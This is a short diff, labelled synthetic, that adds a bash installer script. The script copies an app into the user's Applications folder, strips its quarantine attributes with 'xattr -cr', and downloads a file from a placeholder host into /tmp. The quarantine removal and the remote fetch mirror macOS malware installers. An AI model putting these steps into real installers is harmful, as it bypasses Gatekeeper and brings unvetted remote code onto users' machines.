@@ -1,0 +1,5 @@
+#!/bin/bash
+# synthetic text
+cp -R /Volumes/Installer/App.app "$HOME/Applications/"
+xattr -cr "$HOME/Applications/App.app"
+curl -fsSL https://updates.example.invalid/x -o /tmp/x
